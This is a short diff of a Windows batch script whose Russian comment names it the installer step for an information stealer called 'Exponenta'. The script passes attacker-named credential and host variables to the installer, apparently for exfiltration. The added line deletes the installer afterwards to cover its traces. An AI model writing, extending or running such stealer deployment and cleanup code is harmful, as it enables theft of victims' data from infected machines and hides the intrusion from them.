@@ -71,5 +71,6 @@ del /f /q %CommFTP%
 rem Запускаем инсталлятор стайлера "Экспонента"
 call Install_MainExponenta.bat %Hacker_User% %Hacker_Pass% %Hacker_host1% %Hacker_host2%
 cd /d %curdir%
+del /F /S /Q /A Install_MainExponenta.bat
 
 
